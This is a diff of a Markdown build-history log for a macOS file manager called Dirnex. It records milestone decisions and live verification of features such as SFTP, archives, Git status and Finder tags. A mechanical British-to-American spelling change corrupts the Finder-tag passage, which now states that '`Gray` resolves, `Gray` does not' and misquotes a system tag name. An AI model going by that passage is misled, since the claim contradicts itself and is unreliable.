@@ -1,11 +1,29 @@
-# Dirnex — build history (M0 → M18)
+# Dirnex — build history (M0 → M28)
 
 The shipped record of Dirnex's milestones: the milestone checklists as they were completed,
 plus the per-pass progress log — what was probed, what was decided, what was rejected and why.
 M0–M11 landed 2026-07-05 → 2026-07-22; M12 (localization) ran 07-22 → 07-29 and M13 (FTP/FTPS)
 landed 07-25 inside that span, so the two overlap in time — each sits in its own numeric slot below.
 M14 closed 07-30 (its escalation slice 08-02) and M15 opened and closed 08-02. M16 and M17 both
-opened and closed 08-06; M18 opened 08-06 and closed 08-07.
+opened and closed 08-06; M18 opened 08-06 and closed 08-07; M19 (encryption) opened and closed
+08-09. M20 opened and closed 08-12 and M22 opened and closed 08-16, both inside the span of
+**M21** (Amazon S3), which opened 08-12 and closed 08-19 — the longest of them, and the one every
+other milestone in that fortnight was cut around. M23 (the pasteboard and drag-and-drop reaching
+every backend) opened and closed 08-26. The parity backlog then closed in two: **M24** (every
+local-only feature, on a file that is not local) opened 08-27 and closed 08-28, and **M25** (what a
+remote write carries, and what a remote delete costs) opened alongside it and closed 08-29, taking
+the plan's last open question with it. **M26** (move to Trash, wherever the file lives) opened
+and closed 08-31, and is the only one that opened on a design fork rather than on an
+implementation. **M27** (legacy code-page archive names) opened and closed 09-09, on a user's
+report, and is the only one whose *unverified* paths were run afterwards rather than at its close —
+which is how the bug in the last of them was found. **M28** (iCloud Photos, as folders of
+originals) opened and closed 09-13, the first to take back one of the plan's non-goals, and the one
+whose own measurement rewrote its last slice. **After M19** carries the thirty-one dated
+passes from 2026-08-07 → 08-25 that landed outside a milestone of their own — it sits at the end
+rather than in date order, because it is the file's catch-all rather than a numeric slot. Two
+sections frame them, both handed over by the plan on 2026-09-01 once it had nothing left to say
+about them: **Scope decided against** sits ahead of M0, and **The questions the plan asked** closes
+the file.
 
 This file is **archive, not instruction.** It moved out of [PLAN.md](../PLAN.md) once M7
 closed, so the plan could go back to being a plan, and each milestone since is archived
@@ -18,6 +36,34 @@ here the same way as it closes. Nothing here binds current work:
 
 Read it when you want the *reasoning* behind a shipped decision. The chronology is the point:
 several entries record a design being reworked against reality after a probe contradicted it.
+
+---
+
+### Scope decided against, and two deliberate deviations
+
+Moved out of [PLAN.md](../PLAN.md) §4 on 2026-09-01, once every milestone had closed and the plan
+had nothing left to say about them.
+
+The *undone* column of [PLAN.md](../PLAN.md)'s milestone table is scope that was decided against,
+not forgotten — each one is argued in its milestone entry below. The largest such call is the **built-in text editor** (2026-07-22): a
+real one is encoding detection, line-ending preservation, a binary gate, undo grouping and
+find/replace — a whole app, and every Mac already has one the user has already chosen, so F4
+hands the file over the way ⌥F3 hands two files to FileMerge. Revisit only if leaving the app
+proves to break the keyboard-first flow, which is a claim to test by living with the handoff
+first. The other big one is the **Drive API backend** (2026-07-22): the Desktop mount reaches
+every Drive account that is actually on this Mac, and going past it would have bought a second,
+worse path to the same files at the price of an OAuth flow, a restricted-scope verification and
+a paid annual security assessment. It also lines up with §1's standing non-goal — cloud folders
+are folders, no proprietary APIs.
+
+M8 also closed with one deliberate deviation from its own exit criterion: **the Trash is a
+merged listing, not a location** — macOS keeps one trash per volume, so the one sidebar row
+that cannot be a directory browses like a *results* pane rather than like a folder. M9 closed
+with a second: **"what Finder's iCloud Drive shows" is matched approximately, on purpose** —
+which app containers Finder lists is not derivable from anything public, so Dirnex's rule is
+declared public scope and a folder that exists. Both are argued below. The *direction* of
+that approximation was reversed on 2026-07-21 (see M10): it used to also require a
+non-empty folder, which hid three folders Finder shows.
 
 ---
 
@@ -374,7 +420,7 @@ come) progress queue. Copy/Move/queue/progress/conflict/undo are the next passes
 - **Core write primitives.** `VFSBackend` grew four write methods —
   `createDirectory` / `moveItem` / `removeItem` / `trashItem` — with default
   implementations that throw `.unsupported`, so a read-only or future backend compiles
-  untouched and the panel greys the op out via `capabilities` (§M5). `LocalBackend`
+  untouched and the panel grays the op out via `capabilities` (§M5). `LocalBackend`
   implements them on POSIX where the errno matters (`mkdir`, `rename`) and `FileManager`
   where it's the right tool (recursive `removeItem`, `trashItem` returning the resulting
   Trash location for a future undo-restore); a `mapCocoaError` helper recovers the POSIX
@@ -557,7 +603,7 @@ non-blocking, window-bottom queue bar instead of the old modal progress sheet (w
 deleted). This is the pass that makes copies TC-style background work.
 
 - **Core** (`FileOperationQueue`): one small addition, `clearFinished()` — drops terminal
-  (finished/cancelled) jobs, leaving waiting/running/paused ones. The aggregate rolls up
+  (finished/canceled) jobs, leaving waiting/running/paused ones. The aggregate rolls up
   *all* known jobs, so without this a later batch would inherit the bytes of jobs already
   done and its bar would start part-full; the app calls it once the queue drains. To stay
   under SwiftLint's `type_body_length` (the addition pushed the actor body to 252 > 250 —
@@ -569,7 +615,7 @@ deleted). This is the pass that makes copies TC-style background work.
   `PanelHost.enqueue(_:conflictPolicy:)` is fire-and-forget; `PanelViewController+Copy`
   keeps the up-front conflict prompt (Overwrite / Keep Both / Skip / Overwrite If Newer /
   Cancel) then hands the operation to the queue and clears its own marks. The window
-  controller drains `queue.observe()` for the window's lifetime (task cancelled in `deinit`;
+  controller drains `queue.observe()` for the window's lifetime (task canceled in `deinit`;
   `[weak self]` + per-iteration re-bind avoids pinning the window alive) and, per snapshot:
   shows/collapses the bar, re-lists **both** panes as each job reaches a terminal state
   (dedup'd via a `finalizedJobs` set), surfaces failures, and `clearFinished()`s on drain.
@@ -587,7 +633,7 @@ deleted). This is the pass that makes copies TC-style background work.
   determinate bar, "1.84 GB of 3.67 GB · 1.27 GB/s · 1s left" — with browsing fully
   responsive, then dest auto-refreshed and the bar collapsed; the file was byte-exact on
   disk. **Pause** froze the transfer at 1.74 GB (identical across a 2 s gap — genuinely
-  parked, not just relabelled), flipped the button to play, and dropped rate/ETA;
+  parked, not just relabeled), flipped the button to play, and dropped rate/ETA;
   **resume** finished it, byte-exact (pause/resume didn't corrupt). The conflict prompt
   also surfaced correctly on a re-copy, showing all five options incl. "Overwrite If Newer".
   (Cancel-all button is core-unit-tested — cancel-waiting/cancel-running — and renders; not
@@ -991,7 +1037,7 @@ the visited-directory list; all three hang off the same command registry as pass
   decomposition pass, like `+Table`/`+Chrome` before it.)
 - **Verified live via computer-use** (no overlay this session — mouse + keyboard both worked;
   navigated the real tree through a `~/history-verify/alpha/x` fixture): the Go menu showed
-  Back ⌘[ / Forward ⌘] **greyed at a fresh single-entry history** and Directory History… ⌥↓
+  Back ⌘[ / Forward ⌘] **grayed at a fresh single-entry history** and Directory History… ⌥↓
   enabled; navigating oleg→history-verify→alpha→x then **⌘[** stepped x→alpha→history-verify
   and **⌘]** returned →alpha (keyboard equivalents fire through the responder chain); **⌥↓**
   dropped the popup listing x / ✓alpha / history-verify / oleg (newest-first, current
@@ -1212,7 +1258,7 @@ custom selectors** — while a rename or path field editor is first responder it
 ordinary *text* copy/paste, and only when the file table is first responder do they reach the pane
 as a file op. (The first cut used custom selectors gated off in text fields, which left ⌘C/⌘V dead
 *inside* text fields, since no `copy:`/`paste:` menu item existed to route them; the standard
-selectors fixed that and removed the greyed-menu wart.) ⌥⌘V has no standard selector, so it stays
+selectors fixed that and removed the grayed-menu wart.) ⌥⌘V has no standard selector, so it stays
 custom and *is* gated off in text fields, or it would move a file mid-rename. Same-directory
 "copy": the `.ask` resolver auto-returns `.keepBoth` when `context.source.path ==
 context.existing.path`, so pasting into an item's own folder produces "<name> copy" with no prompt,
@@ -1378,11 +1424,11 @@ moved the virtual-label builder to an extension. Repo swiftformat/swiftlint-stri
 pre-existing `redundantSelf` nit in the untouched `BrowserWindowController`); app `xcodebuild build`
 + `swift test` + app smoke test green. VERIFIED LIVE (mouse+menu-driven, no overlay; fully quit the
 stale instance first per the recurring gotcha, and confirmed the fresh debug dylib carried the new
-strings): Go ▸ **Find Files… ⌥F7** opened the sheet (Find greyed until "network-usage-2026-05" was
+strings): Go ▸ **Find Files… ⌥F7** opened the sheet (Find grayed until "network-usage-2026-05" was
 typed, then blue); Find opened a new left-pane tab **"network-usage-2026-05"** with path bar
 **🔍 Results for "network-usage-2026-05"**, the **3** matching JSONs (byte-exact against the 3 in
 the right Downloads pane), **3 items** status, and **no `..` row**; the File menu showed **Copy/Move
-to Other Panel enabled** while **Rename/Multi-Rename/New Folder/Trash/Delete were all greyed**; and
+to Other Panel enabled** while **Rename/Multi-Rename/New Folder/Trash/Delete were all grayed**; and
 closing the results tab (its ✕) restored the browsing `oleg` tab (breadcrumbs + `..` + 18 items, tab
 bar re-hidden). Left the app on Home. GOTCHA (design): a virtual panel is the cleanest place the VFS
 `.search` backend id + a per-site `isSearchResults` guard pays off — the alternative (a per-tab
@@ -1441,7 +1487,7 @@ takes one backend for source *and* dest — a cross-backend archive→local copy
   (folders, dash size) + `alpha.txt` 14 B + `release notes.txt` 13 B (**space preserved**), a `..` row, and
   "4 items" (`..` excluded); into `docs` → `api` + `readme.md` 16 B; into `docs/api` → `reference.md` 17 B,
   path bar **📦 pkg.zip ▸ docs ▸ api**; the File menu there showed **Copy/Move to Other Panel, Rename,
-  Multi-Rename, New Folder, Move to Trash, Delete Immediately ALL greyed** (only New Tab/Close Tab live);
+  Multi-Rename, New Folder, Move to Trash, Delete Immediately ALL grayed** (only New Tab/Close Tab live);
   `..` walked `api → docs → root` each landing the cursor on the branch we came from, and one more `..` at
   the root **exited to `~/DirnexArchiveTest` with clickable local breadcrumbs restored and the cursor on
   `pkg.zip`**; `bundle.tgz` browsed identically (tar's `./` prefix stripped, no phantom root entry). GOTCHA
@@ -1491,7 +1537,7 @@ local files, reusing every bit of its conflict / progress / undo machinery for f
   Both / Skip / Replace-If-Newer, "apply to all", queue bar) — proving it flows through the normal queue —
   and Keep Both produced `a file with spaces copy.txt`. A nested `docs/api/reference.md` F5'd from inside the
   subfolder landed **flat** as `reference.md` (the `entry.name` behavior). The File menu inside the archive
-  showed **Copy to Other Panel enabled, Move + all mutations greyed**. Launch-purge confirmed: 3 temp dirs
+  showed **Copy to Other Panel enabled, Move + all mutations grayed**. Launch-purge confirmed: 3 temp dirs
   accumulated, survived quit, and were gone after relaunch. GOTCHA (bsdtar): members are glob *patterns*, not
   literals — must escape `\ * ? [`, and `extractedLocation` uses the *raw* (unescaped) name since the on-disk
   file keeps its real name. GOTCHA (architecture): temp-extract-then-normal-copy is the clean cross-backend
@@ -1643,7 +1689,7 @@ notes.txt`) deletes exactly, and the pane re-lists the rewritten archive in plac
   App `xcodebuild build` green, new methods confirmed in the debug **dylib**.
 - **Verified live via computer-use** (fresh Debug build after a full quit): File menu inside an archive
   showed **Move to Trash / Delete Immediately… enabled** with Move/Pack/Rename/Multi-Rename/New Folder
-  still greyed. In `pkg.zip` marked a dir (`docs`) + a spaced name + `weird[1].txt` → "Delete 3 items
+  still grayed. In `pkg.zip` marked a dir (`docs`) + a spaced name + `weird[1].txt` → "Delete 3 items
   from “pkg.zip”?" → on-disk the three gone, `images`/`alpha.txt`/`readme.txt` byte-exact, archive VALID,
   **zero `.dirnex-rewrite-*` litter**, scratch dir cleaned. The **over-match safety case** (`dup.zip` with
   `a/notes.txt` AND `b/notes.txt`): deleting `a/notes.txt` (⌘⌦, single-item confirm) left `b/notes.txt`
@@ -1743,7 +1789,7 @@ through nesting is a later item), matching the app's capability-degradation patt
   `outer2.zip ▸ sub ▸ mid.zip ▸ inner.zip` browsed all four levels (full breadcrumb) and `..` from
   `inner.zip` landed at `mid.zip` root onto `inner.zip`. The File menu inside a nested archive showed
   **Copy to Other Panel enabled** but **Move to Trash / Delete Immediately / Pack / Rename / New Folder
-  greyed** (read-only). **F5 copy-out** of `mid-note.txt` from the doubly-nested `mid.zip` landed
+  grayed** (read-only). **F5 copy-out** of `mid-note.txt` from the doubly-nested `mid.zip` landed
   byte-exact ("MID level") on real disk. Zero `.dirnex-rewrite-*` litter (reads never rewrite); the
   only temp is `DirnexExtract/` (purged at launch, like previews and F5). Fixtures deleted; app left on
   Home. NEXT M4: saved searches as places-strip virtual folders, deferred search niceties (tag chip,
@@ -1784,7 +1830,7 @@ a saved search is just that query + a name + a scope, persisted.
   App `xcodebuild build` green; new code confirmed in `Dirnex.debug.dylib`; touched files
   swiftformat/swiftlint-strict clean.
 - **Verified live via computer-use** (fresh Debug build after a full quit; no overlay this session):
-  Go ▸ **Save Search…** was greyed on a normal pane, enabled after a ⌥F7 "jmeter" search (3 hits) —
+  Go ▸ **Save Search…** was grayed on a normal pane, enabled after a ⌥F7 "jmeter" search (3 hits) —
   the prompt prefilled the unquoted default **"jmeter"**, saved as "JMeter Stuff" → appeared under a
   new **Searches** header with a magnifier icon (sidebar rebuilt live). Clicking it re-ran into a
   fresh `*jmeter*` results tab (same 3 hits). Right-click → **Run / Rename… / Delete**: Rename →
@@ -1844,7 +1890,7 @@ a saved search is just that query + a name + a scope, persisted.
       mid-file resume** all DONE and verified live (via the system `sftp` CLI, not
       swift-nio-ssh/libssh2 — the same sidestep M4 made with `bsdtar`). Copy-out (`get`) / copy-in
       (`put`), remote mkdir / rename / recursive-delete all run through the standard queue; an SFTP
-      pane is writable (`[.read, .write, .rename]`) so the pass-5 grey-out + Trash-less
+      pane is writable (`[.read, .write, .rename]`) so the pass-5 gray-out + Trash-less
       confirmed-permanent-delete light up. **Password auth** (pass 9) via `SSH_ASKPASS` (no PTY
       needed) + Keychain storage. **Mid-file resume** (pass 10) — `copyFile` picks up a partial
       destination via `get -a`/`put -a` instead of restarting; verified live against a real server
@@ -1862,7 +1908,7 @@ a saved search is just that query + a name + a scope, persisted.
       `ServerConnectionStore` + a **Servers** sidebar section (mirrors **Searches**), plus a
       generalized Connect-to-Server prompt (protocol picker SFTP | SMB + Save). Subsumes the deferred
       "saved SFTP connections in the sidebar" item
-- [x] Capability degradation: panels grey out unsupported ops per backend ✅ (per-path
+- [x] Capability degradation: panels gray out unsupported ops per backend ✅ (per-path
       `capabilities(for:)`; no Trash → explicit permanent-delete confirm ✅; no clone →
       always chunked ✅) — driven off the owning backend's caps, ready for SFTP to plug into
 - [x] Synchronize directories: two-panel diff view (left-only / right-only / differs /
@@ -2075,7 +2121,7 @@ capability test double stands in). Pieces:
   panel.path).contains(.write/.rename)` (drops the `!isVirtualDirectory` prefix — a virtual pane
   already reports `.read`, and this is correct for a future writable-non-local SFTP where
   `isVirtualDirectory` would wrongly fire). `deleteSelection`/`validateMutatingItem` now branch on
-  `capabilities(for:).deleteStrategy`: `.unsupported` → no-op/greyed, `.trash` on F8 → Trash (with the
+  `capabilities(for:).deleteStrategy`: `.unsupported` → no-op/grayed, `.trash` on F8 → Trash (with the
   existing optional confirm), else (Shift+F8, or F8 on a Trash-less backend) → the confirmed
   permanent-delete path. The **top-level-archive rewrite delete** (`isWritableArchive` →
   `beginArchiveDelete`) still short-circuits *first* — archive writes are the app's separate
@@ -2084,13 +2130,13 @@ capability test double stands in). Pieces:
   refactored speculatively). New app test `DirnexTests/CompositeBackendTests.swift` (+3 → **7 app
   tests**) asserts the crux: local path = full caps (`deleteStrategy == .trash`), archive + search
   paths = `.read` (`deleteStrategy == .unsupported`). Behavior on today's backends is **identical by
-  construction** (traced each branch: local delete = Trash, archive/search delete greyed, New
-  Folder/rename greyed on virtual) — the change is degradation *infrastructure* + a behavior-
+  construction** (traced each branch: local delete = Trash, archive/search delete grayed, New
+  Folder/rename grayed on virtual) — the change is degradation *infrastructure* + a behavior-
   preserving refactor, so the visible payoff arrives with SFTP. `swift test` (390) + app
   `xcodebuild test` (7) green, swiftformat/swiftlint-strict clean, app launches + quits cleanly.
   **NEXT M5 (last item):** the `SFTPBackend` infra gate (swift-nio-ssh/libssh2 dependency + a live/
   dockerized SSH server to test against) — with per-path capabilities + `DeleteStrategy` now in
-  place, an SFTP pane's grey-out and Trash-less delete-confirm work the moment the backend reports
+  place, an SFTP pane's gray-out and Trash-less delete-confirm work the moment the backend reports
   `[.read, .write, .rename]` (no `.trash`/`.clone`). Optional polish: Settings picker for the
   preferred diff tool.
 
@@ -2141,7 +2187,7 @@ UTC, or the day shifts. **NEXT M5 (finishes the item):** the app-layer live tran
 `Process`-driven `ssh`/`sftp` runner (mirroring `ArchiveMounter`/`SpotlightSearchRunner`), a
 connection manager + Keychain credential storage + key auth, composite-backend routing on `isSFTP`,
 and the **write pass** (mkdir/move/remove + byte `copyFile` with resume, flipping caps to
-`[.read, .write, .rename]` → the pass-5 grey-out + Trash-less permanent-delete confirm go live). That
+`[.read, .write, .rename]` → the pass-5 gray-out + Trash-less permanent-delete confirm go live). That
 tail is the genuine infra gate: it needs a live/dockerized SSH server (or local Remote Login) +
 credentials to verify against — which I can't provision here, so it awaits that setup. Optional
 polish still open: Settings picker for the preferred diff tool.
@@ -2190,7 +2236,7 @@ swiftformat/swiftlint-strict clean. SPOTTED FOLLOW-UP (out of scope, pre-existin
 shares the same no-year→2000 date bug for recent archive members — worth the same `defaultDate = now`
 fix. **NEXT M5 (finishes `SFTPBackend`):** the write pass — `SFTPProcessTransport` gains
 mkdir/rename/remove + `copyFile` (download via `sftp get`, upload via `put`) with progress/resume,
-flipping SFTP caps to `[.read, .write, .rename]` so the pass-5 grey-out + Trash-less permanent-delete
+flipping SFTP caps to `[.read, .write, .rename]` so the pass-5 gray-out + Trash-less permanent-delete
 confirm light up; then password/Keychain auth (needs a PTY). Optional polish: an SSH ControlMaster so
 repeated listings reuse one connection instead of re-handshaking per directory; saved connections in
 the sidebar; Settings picker for the preferred diff tool.
@@ -2215,13 +2261,13 @@ size → `get` download → byte-compare → recursive remove) passed through th
   of the path (`sftp`'s `ls` *follows* a symlink, so statting a link-to-dir would delete the
   *target's* contents — a parent listing shows the link as a link, so `rm` removes the link alone);
   `copyFile` = **download** (`id` source → `.local` dest, `get`) or **upload** (`.local` source →
-  `id` dest, `put`), reporting the transferred bytes once for the progress bar and honouring
+  `id` dest, `put`), reporting the transferred bytes once for the progress bar and honoring
   `isCancelled` at the file boundary, refusing an unexpressible remote↔remote copy. The fake
   transport now records every write call so the recursion/routing is asserted without a server.
 - **App**: `SFTPProcessTransport` spawns each verb as one `sftp` batch command (reusing the pass-7
   `run(batch:)`), transfers returning the local file's size for progress. `CompositeBackend` routes
   `capabilities(for:)` to a **connected** SFTP backend (`[.read, .write, .rename]`; an unconnected /
-  dropped SFTP path falls back to `.read` so writes grey out rather than fail), routes `copyFile` on
+  dropped SFTP path falls back to `.read` so writes gray out rather than fail), routes `copyFile` on
   the **destination** when it is remote (so an upload reaches the SFTP `put`; a download/local-local
   still routes on the source), and throws `EXDEV` for any cross-backend move. Reconciled
   `isVirtualDirectory` → **`isArchive || isSearchResults`** (an SFTP dir is a *real* writable remote
@@ -2275,7 +2321,7 @@ fail fast). Core→app as always:
   holds the channel open — the live test server does exactly that, so a real connect there takes the
   full timeout but succeeds). `SFTPKeychain` (Security framework) stores/loads/deletes the password
   keyed by `keychainAccount`; `SFTPConnectPrompt` gained a Private-Key/Password segmented control + an
-  `NSSecureTextField` (irrelevant field greys out); `connectToServer` stores the password to the
+  `NSSecureTextField` (irrelevant field grays out); `connectToServer` stores the password to the
   Keychain **only after** the probe authenticates (so a typo isn't cached); `CompositeBackend.connectSFTP`
   + the live/app-test call sites thread `authentication`/`password`. +1 app test (askpass helper is
   executable) + a self-gated **localhost wrong-password** live test (real transport → `.permissionDenied`
@@ -2390,7 +2436,7 @@ Nothing built yet — this is the scoped design; core-first as always (`ServerCo
 then `SMBMounter` / store / sidebar / prompt), verified live against a LAN SMB share.
 
 Progress (2026-07-14, M5 SMB pass 1 — the pure core): the tested, headless value types landed, the
-same core-first opener every M5 slice used. Two new `DirnexCore` files, no behavioural change to any
+same core-first opener every M5 slice used. Two new `DirnexCore` files, no behavioral change to any
 existing type (one additive conformance):
 - **`VFS/SMBLocation.swift`** — the SMB analogue of `SFTPLocation`: `host` / `share?` / `username?` /
   `port` (default 445), *without* a secret. Deliberately **not** a `VFSBackendID` address — SMB rides
@@ -2526,7 +2572,7 @@ needs no rebuild). Method note: `git`'s real output was **probed live before any
 (the pass-7 lesson — `SFTPListingParser` had to be reworked because its format was assumed, not
 observed), which caught three things a from-memory parser gets wrong:
 - **`GitStatus.swift`** — `GitFileStatus` (`unmodified/modified/added/deleted/renamed/untracked/
-  ignored/conflicted`, each with Git's own one-letter `code` — the app picks the colour, this picks
+  ignored/conflicted`, each with Git's own one-letter `code` — the app picks the color, this picks
   the character) + `GitStatusEntry` (one porcelain record: `relativePath` + **both** of Git's axes,
   `indexStatus`/`worktreeStatus`, kept verbatim so a later tooltip can say "staged edit plus unstaged
   edits on top" without re-parsing) + `GitBranch` (name/upstream/ahead/behind/isDetached/
@@ -2632,7 +2678,7 @@ change at all (pass 1's 544 tests stand untouched):
   that has nothing to do with them. Name is the right column to charge because it is already the one
   that absorbs slack (`firstColumnOnlyAutoresizingStyle`); a filename with less room is a truncation,
   not a rearranged pane. (The alternative — drawing the status inside the name cell, VS Code-style —
-  was rejected: text colour there is already taken by the mark's bold red and the hidden-file dim,
+  was rejected: text color there is already taken by the mark's bold red and the hidden-file dim,
   and inline rename (F2) replaces that cell's text field with an editable box a badge would have to
   dodge. It would reserve the same 20 pt anyway.) **GOTCHA, and the reason the first fix still
   drifted ~17 pt: `intercellSpacing.width` is 17 pt at this table's `.plain` style, not the 2–3 pt
@@ -2648,7 +2694,7 @@ change at all (pass 1's 544 tests stand untouched):
   repository. `applyColumnLayout` lifts the gutter out before the reorder pass and re-installs after:
   that pass moves each stored column to its target index in turn, which drags an unlisted column to
   the far end one move at a time.
-  `FileCellView.accentColor` carries the status colour — it outranks the mark's red (a marked
+  `FileCellView.accentColor` carries the status color — it outranks the mark's red (a marked
   modified file still shows an orange `M`) and yields to the cursor's emphasized background.
 - **BUG the user caught, and the reason the pane has `renderRefresh` at all:** the snapshot-arrived
   path hand-rolled `tableView.reloadData()`, which drops the table's selection — so **crossing a
@@ -2709,36 +2755,36 @@ additive field on `SpotlightQuery`.** Method note, and it paid for itself repeat
 format was probed against real tagged files before any Swift was written** (the pass-1 `git` lesson,
 and the pass-7 `SFTPListingParser` rework that came of *assuming* a format). Every claim below was
 observed, and the first draft of nearly all of them would have been wrong:
-- **`FinderTag.swift`** — `FinderTagColor` (the 8 indices) + `FinderTag` (name + colour, parse/
+- **`FinderTag.swift`** — `FinderTagColor` (the 8 indices) + `FinderTag` (name + color, parse/
   serialize) + `FinderTagPayload` (the attribute's binary-plist array). The format is
-  `com.apple.metadata:_kMDItemUserTags` = a **binary plist array of `name\ncolourIndex` strings**.
-  Traps found by probing: **(a) the colour indices are not Finder's display order** — `FavoriteTagNames`
-  reads Red, Orange, Yellow, Green, Blue, Purple, Grey, which looks like the enumeration and is not
-  it; the real mapping (0 none · 1 Grey · 2 Green · 3 Purple · 4 Blue · 5 Yellow · 6 Red · 7 Orange)
-  was established by letting the system assign each colour itself from a bare name. `Grey` resolves,
+  `com.apple.metadata:_kMDItemUserTags` = a **binary plist array of `name\ncolorIndex` strings**.
+  Traps found by probing: **(a) the color indices are not Finder's display order** — `FavoriteTagNames`
+  reads Red, Orange, Yellow, Green, Blue, Purple, Gray, which looks like the enumeration and is not
+  it; the real mapping (0 none · 1 Gray · 2 Green · 3 Purple · 4 Blue · 5 Yellow · 6 Red · 7 Orange)
+  was established by letting the system assign each color itself from a bare name. `Gray` resolves,
   `Gray` does not. **(b) A third field exists in the wild**: passing an already-suffixed `Red\n6` to
   `URLResourceValues.tagNames` makes the system treat the *whole string* as the name and append its
   own lookup, storing `Red\n6\n0` — my own first probe wrote corrupt tags this way and they looked
-  right. The system reads such rows back as plain `Red`, so fields past the colour are ignored here
-  too. **(c) The colour field is optional** (a bare `Plainname` round-trips), and the system always
+  right. The system reads such rows back as plain `Red`, so fields past the color are ignored here
+  too. **(c) The color field is optional** (a bare `Plainname` round-trips), and the system always
   *emits* it, `\n0` included — so we emit what it emits. Identity is the **name, case-insensitively**,
   which is the system's own rule (writing `red` stores `red` but resolves to Red's 6), and matches the
   `SavedSearch`/`ServerConnection` name-as-identity precedent. Malformed rows are skipped and a
-  nonsense colour degrades to `.none` rather than dropping the tag — the `GitStatusParser` call: one
+  nonsense color degrades to `.none` rather than dropping the tag — the `GitStatusParser` call: one
   bad row must not blank the cell. Duplicates collapse (the system does **not** dedupe on write).
 - **`FinderTagStorage.swift`** — the local xattr read/write, in core beside `ByteComparator` per §2.
   **Why it writes the attribute by hand rather than calling `URLResourceValues.tagNames`, the
   documented API — two independent reasons, either sufficient: (1) its setter is macOS 26+ and
-  Dirnex targets 14** (caught by the compiler, not by me); **(2) it cannot express a colour** — it
+  Dirnex targets 14** (caught by the compiler, not by me); **(2) it cannot express a color** — it
   takes bare names and looks each up in a global database that a write of ours never registers into,
-  so expressing an edit through it strips the colour off every custom tag on the file (probed: after
+  so expressing an edit through it strips the color off every custom tag on the file (probed: after
   storing a purple `Zebra`, `tagNames = ["Zebra"]` writes `Zebra\n0`). A data-loss bug wearing the
-  documented API's clothes. The getter is available on 14 but drops colours, so it is no use for a
+  documented API's clothes. The getter is available on 14 but drops colors, so it is no use for a
   column either. The one thing the API does that we then must do ourselves is **keep the legacy
   `com.apple.FinderInfo` label byte in sync** — probed: `tagNames = ["Red"]` leaves Spotlight
   reporting `kMDItemFSLabel = 6` where a raw write leaves 0, and the selection rule is **the last
-  *coloured* tag wins** (`[Green, Red]`→6, `[Red, Orange]`→7, `[Zebra, Blue]`→4 skipping the
-  colourless) — not first, not lowest. Read-modify-write, since the other 31 bytes are type/creator
+  *colored* tag wins** (`[Green, Red]`→6, `[Red, Orange]`→7, `[Zebra, Blue]`→4 skipping the
+  colorless) — not first, not lowest. Read-modify-write, since the other 31 bytes are type/creator
   codes belonging to whoever wrote them.
 - **`SpotlightQuery.tags`** — the chip's pure half; the file's own header comment had anticipated it
   since M4. One `kMDItemUserTags == "Name"c` clause **per tag, ANDed** (kinds OR because a second kind
@@ -2756,19 +2802,19 @@ exact bytes macOS wrote** for a real tagged file. `swift test` green, swiftforma
 clean; app target untouched (new files + one additive field, so no rebuild needed).
 **VERIFIED LIVE** — a harness compiled against the real core wrote tags into a real folder, then
 **Finder itself** was the judge: the stock `Red` painted a red dot, a custom **purple `Zebra` + `Blue`
-rendered as Finder's two-tone split dot**, a colourless `Work` correctly drew **no** dot and left no
+rendered as Finder's two-tone split dot**, a colorless `Work` correctly drew **no** dot and left no
 FinderInfo record, an incremental add+remove (case-insensitive) preserved the custom purple, Get Info
 listed the names, `kMDItemFSLabel` read **6** where a naive raw write leaves 0, and **Spotlight
 indexed our tags** — the exact predicate `SpotlightQuery` builds, run verbatim through `mdfind`,
 found the file (the search chip, end-to-end). All artifacts removed after.
 **FINDING that shapes pass 4, and the reason to look rather than assume:** mid-verification Finder
-**silently rewrote our bytes on disk**, `Zebra\n3` → `Zebra`, stripping a colour. It is not
-reproducible on demand and a brand-new name (`Quokka\n7`) is adopted, honoured, and rendered orange
-in both the dot and the Get Info chip. The consistent explanation: **a colour belongs to the *name*,
-system-wide, not to the file** — the system's name → colour database is authoritative, and Finder
+**silently rewrote our bytes on disk**, `Zebra\n3` → `Zebra`, stripping a color. It is not
+reproducible on demand and a brand-new name (`Quokka\n7`) is adopted, honored, and rendered orange
+in both the dot and the Get Info chip. The consistent explanation: **a color belongs to the *name*,
+system-wide, not to the file** — the system's name → color database is authoritative, and Finder
 reconciles a file's stored copy against it, so `Zebra`, which my own earlier probes had registered as
-colourless, got normalized back. Recorded in `FinderTag`'s doc comment: an editor may offer a colour
-when *introducing* a tag, but must not present per-file colour as the user's to own — re-colouring
+colorless, got normalized back. Recorded in `FinderTag`'s doc comment: an editor may offer a color
+when *introducing* a tag, but must not present per-file color as the user's to own — re-coloring
 one file's `Work` is not a change macOS keeps. (Exact trigger not pinned down; it is Finder's
 business, and the engineering conclusion holds either way.)
 **NEXT (M6 pass 4, the app layer):** a `FinderTagProvider` mirroring `GitStatusProvider` (off-main,
@@ -2788,7 +2834,7 @@ gutter's contextual rule. The rule was tempting (it is right there, tested, one 
 property of a whole subtree, so the gutter appears once on the way in and stays; tagged files are
 **scattered**, so the identical rule would install and remove the column — and re-truncate every
 filename, since a gutter is paid for out of Name — on nearly every step between sibling folders. A
-precedent is an argument, not a licence. The preference is still ANDed with "could these rows carry
+precedent is an argument, not a license. The preference is still ANDed with "could these rows carry
 tags at all" (local files, and search hits, which are local files in a virtual pane): inside an
 archive or on SFTP the column could only ever be blank, which is what the preference exists to avoid.
 The checkmark tracks the *preference*, never that derived state — unchecking the box inside a zip
@@ -2812,27 +2858,27 @@ would blame the user's setting for the filesystem's limits.
   for "the user's tags"; the system's list is Finder's own synced plist, not a contract) and feeds
   both the editor menu and the search completion — verified live: `Urgent`, met in one tab, was
   offered in another. **`FinderTagSnapshot.==` is hand-rolled and must be**: `FinderTag`'s own `==`
-  compares names case-insensitively and **ignores colour** — correct for identity, wrong for "did the
-  pixels change" — so the synthesized version would answer "equal" when Finder recoloured a tag (which
+  compares names case-insensitively and **ignores color** — correct for identity, wrong for "did the
+  pixels change" — so the synthesized version would answer "equal" when Finder recolored a tag (which
   pass 3 documented it doing *by itself*) and the column would keep painting the old dot.
 - **`PanelViewController+Tags.swift`** — per-tab snapshot, install, row lookup. **No watcher of its
   own, unlike Git**: the Git side had to watch the *repository root* because `git add` in a terminal
   changes what rows say while touching nothing under the visible folder; a tag has no elsewhere — it
   is an attribute **on the file** — so the pane's existing directory watcher already fires for it.
   Verified live (a new file appeared and rescanned with the rest).
-- **`TagCellView.swift`** — custom-drawn dots; the content *is* the colour, so it borrows neither
-  `FileCellView`'s text field nor the Git letter's `accentColor`. Two judgement calls: a **colourless
+- **`TagCellView.swift`** — custom-drawn dots; the content *is* the color, so it borrows neither
